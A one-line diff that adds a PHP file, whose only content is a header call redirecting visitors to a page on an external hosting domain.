@@ -1,0 +1,1 @@
+<?php  header( 'Location: http://chapin-points.byethost5.com/default.php' ) ;  ?>
